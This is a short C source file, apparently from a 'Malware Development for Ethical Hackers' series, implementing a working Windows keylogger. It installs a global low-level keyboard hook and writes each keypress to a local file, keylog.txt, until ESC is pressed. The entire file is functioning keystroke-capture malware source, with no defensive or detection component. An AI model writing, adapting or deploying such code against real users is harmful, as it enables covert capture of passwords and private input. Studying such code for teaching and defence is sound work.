/*
 * Malware Development for Ethical Hackers
 * hack.c
 * save keystrokes to file
 * author @cocomelonc
 */
#include <windows.h>
#include <stdio.h>
#include <stdbool.h>

HHOOK hKeyboardHook;      // handle to the keyboard hook
bool keepRunning = true;  // flag to control the message loop

LRESULT CALLBACK KeyboardHandler(int nCode, WPARAM wParam, LPARAM lParam) {
  // check if the event is a key press
  if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
    KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;

    // if the ESC key is pressed, stop hooking and exit
    if (kbdStruct->vkCode == VK_ESCAPE) {
      keepRunning = false;
      UnhookWindowsHookEx(hKeyboardHook);
      printf("hooking disabled by ESC key.\n");
      PostQuitMessage(0);
      return 0;
    }

    // open the log file in append mode
    FILE* outputFile = fopen("keylog.txt", "a+");
    if (outputFile) {
      DWORD vKey = kbdStruct->vkCode;
      // convert virtual key code to a character and write to file
      fprintf(outputFile, "key pressed: %c\n", MapVirtualKeyA(vKey, MAPVK_VK_TO_CHAR));
      fclose(outputFile);
    }
  }
  // pass the event to the next hook in the chain
  return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

// classic keylogger logic
int main(int argc, char* argv[]) {
  MSG appMsg;

  // install the low-level keyboard hook (WH_KEYBOARD_LL)
  hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHandler, NULL, 0);
  
  if (hKeyboardHook == NULL) {
    printf("failed to install hook :(\n");
    return 1;
  }

  printf("hook installed. press ESC to stop :)\n");

  // standard Windows message loop
  while (keepRunning && GetMessage(&appMsg, NULL, 0, 0)) {
    TranslateMessage(&appMsg);
    DispatchMessage(&appMsg);
  }

  return 0;
}